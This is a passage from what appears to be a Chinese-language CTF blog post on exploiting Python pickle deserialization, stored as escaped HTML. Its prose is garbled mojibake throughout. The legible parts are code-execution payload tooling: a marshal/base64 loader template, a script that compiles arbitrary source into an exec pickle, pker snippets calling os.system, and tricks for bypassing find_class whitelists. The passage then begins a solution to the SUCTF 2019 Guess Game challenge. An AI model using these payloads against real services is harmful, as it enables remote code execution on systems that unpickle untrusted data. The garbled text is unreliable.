&lt;/span>&lt;span style="color:#d88200">(cmarshal
&lt;/span>&lt;span style="color:#d88200">loads
&lt;/span>&lt;span style="color:#d88200">(cbase64
&lt;/span>&lt;span style="color:#d88200">b64decode
&lt;/span>&lt;span style="color:#d88200">(S&amp;#39;&lt;/span>&lt;span style="color:#d88200">%s&lt;/span>&lt;span style="color:#d88200">&amp;#39;
&lt;/span>&lt;span style="color:#d88200">tRtRc__builtin__
&lt;/span>&lt;span style="color:#d88200">globals
&lt;/span>&lt;span style="color:#d88200">(tRS&amp;#39;&amp;#39;
&lt;/span>&lt;span style="color:#d88200">tR(tR.&amp;#34;&amp;#34;&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">b64encode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">marshal&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">dumps&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">foo&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">func_code&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210810015119794.png" alt="image-20210810015119794">&lt;/p>
&lt;p>â€”â€”â€”â€”æˆ–è€…ä¸‹é¢è¿™ä¸ªæ¨¡æ¿ä¹Ÿå¯ä»¥è¾¾åˆ°ä¸Šé¢çš„æ•ˆæžœï¼ˆæ‰§è¡Œä»£ç  è€Œä¸åŒ…å«ç±»å’Œå‡½æ•°ï¼‰ï¼ˆæ¥æºï¼š&lt;a href="https://gist.github.com/freddyb/3360650#file-pickle_compiler-py">pickle_compiler.py&lt;/a>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#00a8c8">try&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">cPickle&lt;/span> &lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#111">pickle&lt;/span>
&lt;span style="color:#00a8c8">except&lt;/span> &lt;span style="color:#75af00">ImportError&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">pickle&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">sys&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">argv&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">picklecompiler&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">sourcefile&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">sourcecode&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">file&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">sourcefile&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">read&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#34;c__builtin__&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">eval&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">(c__builtin__&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">compile&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">(&lt;/span>&lt;span style="color:#d88200">%s&lt;/span>&lt;span style="color:#d88200">S&amp;#39;&amp;lt;payload&amp;gt;&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">S&amp;#39;exec&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">tRtR.&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">dumps&lt;/span>&lt;span style="color:#111">(&lt;/span> &lt;span style="color:#111">sourcecode&lt;/span> &lt;span style="color:#111">)[:&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">4&lt;/span>&lt;span style="color:#111">],)&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">usage&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#111">print&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&amp;#39;usage: python &lt;/span>&lt;span style="color:#d88200">%s&lt;/span>&lt;span style="color:#d88200"> filename&amp;#39;&amp;#39;&amp;#39;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#111">argv&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">__name__&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#34;__main__&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">argv&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">print&lt;/span> &lt;span style="color:#111">picklecompiler&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">argv&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">])&lt;/span>
&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">usage&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="å·¥å…·äºŒè¿ž---é€šè¿‡upkeruhttpsgithubcomeddieivan01pkeræž„é€ opcode">å·¥å…·äºŒè¿ž - é€šè¿‡&lt;a href="https://github.com/eddieivan01/pker">&lt;u>pker&lt;/u>&lt;/a>æž„é€ opcode&lt;/h3>
&lt;p>åŽŸç†å‚è§ï¼š&lt;a href="https://xz.aliyun.com/t/7012#toc-5">é€šè¿‡ASTæ¥æž„é€ Pickle opcode - è‡ªåŠ¨åŒ–æž„é€ &lt;/a>ï¼Œåˆ©ç”¨äº†æŠ½è±¡è¯­æ³•æ ‘&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809232152276.png" alt="image-20210809232152276">&lt;/p>
&lt;p>pkerä¼šç”¨åˆ°&lt;code>GLOBAL&lt;/code>, &lt;code>INST&lt;/code>, &lt;code>OBJ&lt;/code>è¿™ä¸‰ç§ç‰¹æ®Šå‡½æ•°å’Œä¸€äº›å¿…è¦çš„è½¬æ¢æ–¹å¼ï¼›ä¸‹é¢æ˜¯pkerçš„ç®€å•å°æ —å­ï¼ˆæ›´å¤šä½¿ç”¨è¯´æ˜Žè¯¦è§ä¸Šé¢çš„é“¾æŽ¥ï¼‰&lt;/p>
&lt;ul>
&lt;li>
&lt;p>å…¨å±€å˜é‡è¦†ç›–&lt;/p>
&lt;ul>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e"># è¦†ç›–ç›´æŽ¥ç”±æ‰§è¡Œæ–‡ä»¶å¼•å…¥secretæ¨¡å—ä¸­çš„nameå’Œcategoryæ¨¡å—&lt;/span>
&lt;span style="color:#111">ecret&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">GLOBAL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;__main__&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;secret&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">secret&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;1&amp;#39;&lt;/span>
&lt;span style="color:#111">secret&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">category&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;2&amp;#39;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e"># è¦†ç›–å¼•å…¥æ¨¡å—çš„å˜é‡&lt;/span>
&lt;span style="color:#111">game&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">GLOBAL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;guess_game&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;game&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">game&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">curr_ticket&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;123&amp;#39;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>å‡½æ•°æ‰§è¡Œ&lt;/p>
&lt;ul>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e"># é€šè¿‡b&amp;#39;R&amp;#39;è°ƒç”¨ __reducce__æ–¹æ³•&lt;/span>
&lt;span style="color:#111">s&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;whoami&amp;#39;&lt;/span>
&lt;span style="color:#111">system&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">GLOBAL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;os&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;system&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">system&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e"># é€šè¿‡b&amp;#39;i&amp;#39;è°ƒç”¨&lt;/span>
&lt;span style="color:#111">INST&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;os&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;system&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;whoami&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e"># é€šè¿‡b&amp;#39;c&amp;#39;å’Œb&amp;#39;o&amp;#39;è°ƒç”¨&lt;/span>
&lt;span style="color:#111">OBJ&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">GLOBAL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;os&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;system&amp;#39;&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#d88200">&amp;#39;whoami&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e"># å¤šå‚æ•°è°ƒç”¨å‡½æ•°&lt;/span>
&lt;span style="color:#111">INST&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;[module]&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;[callable]&amp;#39;&lt;/span>&lt;span style="color:#111">[,&lt;/span> &lt;span style="color:#111">param0&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">param1&lt;/span>&lt;span style="color:#f92672">...&lt;/span>&lt;span style="color:#111">])&lt;/span>
&lt;span style="color:#111">OBJ&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">GLOBAL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;[module]&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;[callable]&amp;#39;&lt;/span>&lt;span style="color:#111">)[,&lt;/span> &lt;span style="color:#111">param0&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">param1&lt;/span>&lt;span style="color:#f92672">...&lt;/span>&lt;span style="color:#111">])&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>å®žä¾‹åŒ–å¯¹è±¡ï¼ˆç‰¹æ®Šçš„å‡½æ•°æ‰§è¡Œï¼‰&lt;/p>
&lt;ul>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">animal&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">INST&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;__main__&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;Animal&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;1&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;2&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">animal&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">animal&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">OBJ&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">GLOBAL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;__main__&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;Animal&amp;#39;&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#d88200">&amp;#39;1&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;2&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">animal&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">animal&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">INST&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;__main__&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;Animal&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">animal&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;1&amp;#39;&lt;/span>
&lt;span style="color:#111">animal&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">category&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;2&amp;#39;&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">animal&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;p>å…ˆå¯¹é¢˜ç›®æœ‰å¤§æ¦‚æ€è·¯ï¼Œç„¶åŽè¾…ä»¥å·¥å…·~å¥½è€¶&lt;/p>
&lt;h3 id="å·¥å…·äºŒè¿ž---uanapickleuhttpsgithubcomsensepostanapickle">å·¥å…·äºŒè¿ž - &lt;a href="https://github.com/sensepost/anapickle">&lt;u>anapickle&lt;/u>&lt;/a>&lt;/h3>
&lt;p>å…¶å®žä¸€ä¸ªå¹´é¾„å¾ˆå¤§çš„è„šæœ¬äº†ï¼Œæ”¯æŒpython2.3ã€‚ã€‚ã€‚ã€‚ä½†æ˜¯åŒ…å«äº†å¾ˆå¤špayloadï¼Œå¯ä»¥çµæ´»è¿ç”¨~&lt;/p>
&lt;h2 id="bypass">bypass!!!&lt;/h2>
&lt;h3 id="å¯¹ç±»åž‹çš„æ£€æŸ¥">å¯¹ç±»åž‹çš„æ£€æŸ¥&lt;/h3>
&lt;p>å¯ä»¥åœ¨å·²ç»æž„é€ å¥½çš„opcodeåŽé¢åŽ»æŽ‰&lt;code>.&lt;/code>å†ç»­ä¸Šç›¸åº”çš„å¯¹è±¡çš„opcodeï¼Œä½œä¸ºæ ˆé¡¶çš„å€¼ä¾›æ£€æŸ¥&lt;/p>
&lt;h3 id="é™åˆ¶bcå¯¹æ¨¡å—çš„å¼•å…¥---find_classçš„é‡å†™">é™åˆ¶&lt;code>b'c'&lt;/code>å¯¹æ¨¡å—çš„å¼•å…¥ - &lt;code>find_class()&lt;/code>çš„é‡å†™&lt;/h3>
&lt;p>ä¿®æ”¹&lt;code>find_class()&lt;/code>ä¼šå¼•å…¥å‡½æ•°&amp;amp;æ¨¡å—çš„ç™½åå•ï¼Œä¸€å®šç¨‹åº¦ä¸Šè§£å†³pickleçš„å®‰å…¨æ€§é—®é¢˜ï¼›ä»¥ä¸‹ä¸¤ç§æƒ…å†µä¼šè°ƒç”¨&lt;code>find_class()&lt;/code>çš„æ£€æŸ¥ï¼š&lt;/p>
&lt;ul>
&lt;li>opcodeè§’åº¦ï¼šå‡ºçŽ°&lt;code>c&lt;/code>, &lt;code>i&lt;/code>, &lt;code>b'\x93'&lt;/code>ä¼šè°ƒç”¨&lt;/li>
&lt;li>pythonè§’åº¦ï¼šfind_class()åªä¼šåœ¨è§£æžopcodeæ—¶è°ƒç”¨ä¸€æ¬¡ï¼Œåªè¦ç»•è¿‡opcodeçš„æ‰§è¡Œè¿‡ç¨‹ï¼Œä¹‹åŽå†äº§ç”Ÿçš„å‡½æ•°åœ¨é»‘åå•ä¸­ä¹Ÿä¸ä¼šæ‹¦æˆªï¼ˆæ¯”å¦‚é€šè¿‡&lt;code>__import__&lt;/code>æ¥ç»•è¿‡ï¼‰&lt;/li>
&lt;/ul>
&lt;h3 id="--ä»…å¯ä»¥å¼•å…¥__main__å¼€å¤´çš„æ¨¡å—">&amp;ndash;&amp;raquo;ä»…å¯ä»¥å¼•å…¥&lt;code>__main__&lt;/code>å¼€å¤´çš„æ¨¡å—&lt;/h3>
&lt;p>â€œé€šè¿‡GLOBALæŒ‡ä»¤å¼•å…¥çš„å˜é‡å¯ä»¥çœ‹ä½œæ˜¯åŽŸå˜é‡çš„å¼•ç”¨ï¼Œæˆ‘ä»¬åœ¨æ ˆä¸Šä¿®æ”¹å®ƒçš„å€¼ï¼Œä¹Ÿä¼šä¿®æ”¹åŽŸå˜é‡â€ï¼ŒåŸºäºŽè¿™ä¸€åŽŸç†ï¼Œå½“&lt;code>c&lt;/code>æŒ‡ä»¤åªå…è®¸&lt;code>__main__&lt;/code>æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥å¼•å…¥&lt;code>__main__.blue&lt;/code>ï¼ˆblueè§é¢˜è¡Œäº‹ ä¸Šä¸‹æ–‡ä¸­ä¼šæå‰å¼•å…¥ï¼‰è¿™ä¸ªmoduleï¼Œå†å°†ä¸€ä¸ªdictåŽ‹å…¥æ ˆï¼Œå†…å®¹æ˜¯&lt;code>{'name': 'rua', 'grade': 'www'}&lt;/code>ï¼›ä¹‹åŽæ‰§è¡ŒBUILDæŒ‡ä»¤ï¼Œå°†ä¼šæ”¹å†™&lt;code>__main__.blue.name&lt;/code>å’Œ &lt;code>__main__.blue.grade&lt;/code>ï¼Œæ­¤æ—¶å·²ç»æ‰§è¡Œäº†æˆ‘ä»¬æƒ³è¦çš„å˜é‡è¦†ç›–ã€‚ä¹‹åŽå¼¹æŽ‰æ ˆé¡¶ï¼ŒçŽ°åœ¨ä¸ºç©ºæ ˆï¼Œæ‹¼æŽ¥ä¸Šæ­£å¸¸çš„Studentå¯¹è±¡åºåˆ—åŒ–åŽçš„opcodeã€‚æ­¤æ—¶çš„å®Œæ•´opcodeåœ¨è¢«ååºåˆ—åŒ–æ—¶ï¼Œæ ˆé¡¶æ˜¯æ­£å¸¸çš„Studentå¯¹è±¡ï¼Œè€Œè¢«æ‰§è¡Œæ—¶å´ä¼šå…ˆæ‰§è¡Œä¸€éå‰é¢çš„è¿‡ç¨‹ï¼Œé€ æˆå˜é‡è¦†ç›–ã€‚&lt;/p>
&lt;p>æ—¢ç„¶æˆ‘ä»¬å¯ä»¥åšåˆ°é‡å†™å˜é‡çš„å€¼ï¼Œé‚£ä¹Ÿå¯ä»¥å°†è¿™ä¸ªå€¼æ”¹ä¸ºread wrapperçš„è¿”å›žå€¼åšåˆ°ä»»æ„æ–‡ä»¶è¯»å–ï¼ˆè¯¦è§åŽé¢çš„å†…å®¹ï¼‰&lt;/p>
&lt;h3 id="--ä»…å¯ä»¥å¼•å…¥é¢˜ç›®ä¸­è‡ªè®¾çš„æ¨¡å—æ¨¡å—åä¸èƒ½æœ‰__ç¬¦">&amp;ndash;&amp;raquo;ä»…å¯ä»¥å¼•å…¥é¢˜ç›®ä¸­è‡ªè®¾çš„æ¨¡å—&amp;amp;æ¨¡å—åä¸èƒ½æœ‰&lt;code>__&lt;/code>ç¬¦&lt;/h3>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
æ —å­2 - [SUCTF 2019]Guess Game
&lt;/h4>
&lt;/summary>
&lt;p>æœ¬åœ°å¤çŽ°è¿˜æ˜¯å¤±è´¥ï¼Œæ— è§£ï¼Œdockeråœ°å€-&amp;gt;https://github.com/rmb122/suctf2019_guess_game&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809115950444.png" alt="image-20210809115950444">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809130400358.png" alt="image-20210809130400358">&lt;/p>
&lt;p>æ˜¯ä¸ªçŒœæ•°æ¸¸æˆï¼Œäº¤äº’é€»è¾‘åœ¨init.py, Game.pyå’ŒTicket.pyä¸­ï¼Œ10ä»¥å†…çš„æ•°å­—éœ€è¦çŒœå¯¹10æ¬¡ï¼ˆå…¨èƒœï¼‰æ‰ä¼šè¿”å›žflag&lt;/p>
&lt;p>ç„¶åŽæ˜¯game_client.py&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809130523878.png" alt="image-20210809130523878">&lt;/p>
&lt;p>æŽ¥æ”¶æ•°å­—çš„è¾“å…¥ä½œä¸ºå‚æ•°ç”ŸæˆTicketå¯¹è±¡ï¼Œåºåˆ—åŒ–åŽå‘é€åˆ°serverç«¯&lt;/p>
&lt;p>å†çœ‹game_server.pyï¼Œç”¨äº†é‡å†™äº†çš„&lt;code>find_class()&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809130933730.png" alt="image-20210809130933730">&lt;/p>
&lt;p>è¿™ä¸ªé™åˆ¶çš„æ„æ€æ˜¯å¯¼å…¥çš„æ¨¡å—åªèƒ½ä»¥guess_nameå¼€å¤´å¹¶ä¸”åå­—é‡Œæ²¡æœ‰&lt;code>__&lt;/code>&lt;/p>
&lt;p>å¤§æ¦‚çœ‹å®Œäº†æµç¨‹ï¼ŒæŽ¥ä¸‹æ¥æ‰¾æ‰¾çªç ´å£â€”â€”åºåˆ—åŒ–æ—¶æ˜¯ç”Ÿæˆä¸€ä¸ªTicketçš„å®žä¾‹&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809132300981.png" alt="image-20210809132300981">&lt;/p>
&lt;p>åˆ¤æ–­è¾“èµ¢åˆ™æ˜¯éœ€è¦Gameè¾…åŠ©&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809132437175.png" alt="image-20210809132437175">&lt;/p>
&lt;p>ç»“åˆgame_server.pyçš„åˆ¤æ–­æ¡ä»¶ï¼Œæ‹¿åˆ°flagéœ€è¦&lt;code>self.win_count == max_round == 10&lt;/code>&lt;/p>
&lt;p>é‚£ä¹ˆæž„é€ çš„æ–¹å‘æœ‰äº†â€”â€”ä¿®æ”¹ç›¸å…³å‚æ•°åšåˆ°å˜é‡è¦†ç›–ï¼Œå†ä»¥åºåˆ—åŒ–çš„opcodeå½¢å¼ä¼ è¿‡åŽ»ã€‚æ‰‹å†™opcodeé¢ä¸´çš„é—®é¢˜å°±æ˜¯é‡å†™&lt;code>find_class()&lt;/code>åŽå¯¹åŠ è½½æŒ‡å®šæ¨¡å—çš„é™åˆ¶ï¼Œè€Œè¿™é‡Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°&lt;code>__init__.py&lt;/code>ä¸­&lt;code>game = Game()&lt;/code>ï¼Œæ‰€ä»¥ç›´æŽ¥å¯ä»¥é€šè¿‡&lt;code>guess_game.game&lt;/code>å¼•å…¥&lt;code>Game()&lt;/code>ç±»ï¼Œç„¶åŽä¿®æ”¹ç±»ä¸­çš„win_countå’Œround_countå°±èƒ½åšåˆ°å˜é‡è¦†ç›–ï¼›ç¬¬äºŒè¦æ³¨æ„å¿…é¡»æ‰‹å†™opcodeï¼Œå¦‚æžœæ˜¯å…ˆ&lt;code>from guess_name import game&lt;/code>ï¼Œç„¶åŽä¿®æ”¹å‚æ•°åŽå†dumpï¼Œåˆ™æ˜¯åœ¨è¿è¡Œæ—¶é‡æ–°æ–°å»ºä¸€ä¸ªGameå¯¹è±¡ï¼Œå°±ä¸æ˜¯ä»Žguess_gameè¿™ä¸ªmoduleä¸­èŽ·å–ï¼Œç ´åä¸Šä¸‹æ–‡ï¼›ç¬¬ä¸‰è¦æ³¨æ„&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809140423900.png" alt="image-20210809140423900">&lt;/p>
&lt;p>pickleåºåˆ—åŒ–æµæ‰§è¡Œå®Œä¼šæŠŠæ ˆé¡¶çš„å€¼è¿”å›žï¼Œæ‰€ä»¥æ ˆé¡¶éœ€è¦è®¾ä¸ºTicketï¼Œè¿™é‡Œå¯ä»¥dumpsä¸€ä¸ªTicketï¼Œç„¶åŽæ‹¼åˆ°ä¹‹å‰æ‰‹å†™çš„opcodeä¹‹åŽ&lt;/p>
&lt;p>opcodes:&lt;/p>
